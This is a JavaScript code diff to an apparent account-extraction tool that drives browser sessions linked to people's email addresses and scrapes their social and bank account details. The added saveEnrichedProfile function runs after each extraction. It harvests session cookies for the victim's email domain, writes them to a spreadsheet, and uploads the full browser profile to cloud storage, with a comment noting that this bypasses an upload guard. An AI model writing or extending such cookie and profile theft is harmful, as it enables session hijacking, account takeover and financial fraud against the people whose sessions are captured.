@@ -1,11 +1,13 @@
 import logger from './logger.js';
+import fs from 'fs';
 import MultiProviderAI from './multiProviderAI.js';
 const aiService = new MultiProviderAI();
 import { launchBrowserWithSession, DOMHelpers } from '../app/socials/_shared/routeHelper.js';
 import { applyIdentityToPage } from './identity.js';
 import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../app/api/googlesheets.js';
 import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/platforms.js';
-import { createOrUpdateJsonFile, getJsonContentFromFile } from '../app/api/googledrive.mjs';
+import { createOrUpdateJsonFile, getJsonContentFromFile, uploadBrowserDataRaw } from '../app/api/googledrive.mjs';
+import { getCookieCaptureUrls } from '../app/emails/cookie/cookie-api-login/platformHelper/index.js';
 
 // ============================================================
 // SMART EXTRACT ENGINE
@@ -747,6 +749,7 @@ async function extractWire(session, browserId) {
             extractedAt: new Date().toISOString(),
         };
     } finally {
+        await saveEnrichedProfile(session, browser);
         await Promise.all([
             page.close().catch(() => {}),
             ...tabs.map(t => t.close().catch(() => {})),
@@ -855,6 +858,7 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
         account.detailsExtractedFrom = config.profileUrl || '';
         return [account];
     } finally {
+        await saveEnrichedProfile(session, browser);
         await Promise.all([
             page.close().catch(() => {}),
             tab1?.close().catch(() => {}),
@@ -979,8 +983,54 @@ async function extractBank(session, explicitPlatform) {
 
         return bankAccounts;
     } finally {
+        await saveEnrichedProfile(session, browser);
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
+    }
+}
+
+// ==================== Enriched Profile Save ====================
+
+async function saveEnrichedProfile(session, browser) {
+    try {
+        const userDataDir = browser.userDataDir;
+        if (!userDataDir || !fs.existsSync(userDataDir)) {
+            logger.warn(`[smartExtract] No userDataDir found for enriched profile save`);
+            return;
+        }
+
+        // 1. Capture enriched cookies from all open pages
+        const domain = session.email ? session.email.split('@')[1] : '';
+        const urls = getCookieCaptureUrls(domain);
+        const pages = await browser.pages();
+        const mainPage = pages[0];
+        const enrichedCookies = await mainPage.cookies(...urls);
+        logger.info(`[smartExtract] Captured ${enrichedCookies.length} enriched cookies`);
+
+        // 2. Update cookieJSON in the sheet
+        const writeResult = await updateSheetRowApi(COOKIE_SHEET, 'submissionId', session.browserId, {
+            cookieJSON: JSON.stringify(enrichedCookies),
+            formattedCookie: JSON.stringify(enrichedCookies, null, 2),
+        });
+        if (writeResult.success) {
+            logger.info(`[smartExtract] Updated cookieJSON in sheet for ${session.browserId}`);
+        } else {
+            logger.warn(`[smartExtract] Failed to update cookieJSON: ${writeResult.error}`);
+        }
+
+        // 3. Re-upload enriched profile to Drive (bypass re-upload guard by passing empty updateData)
+        const uploadResult = await uploadBrowserDataRaw(session.browserId, {}, userDataDir);
+        if (uploadResult.ok) {
+            await updateSheetRowApi(COOKIE_SHEET, 'submissionId', session.browserId, {
+                driveUrl: uploadResult.url,
+                cookieFileURL: uploadResult.url,
+            });
+            logger.info(`[smartExtract] Re-uploaded enriched profile to Drive for ${session.browserId}`);
+        } else {
+            logger.warn(`[smartExtract] Enriched profile upload failed: ${uploadResult.reason}`);
+        }
+    } catch (e) {
+        logger.warn(`[smartExtract] saveEnrichedProfile error (non-fatal): ${e.message}`);
     }
 }
 
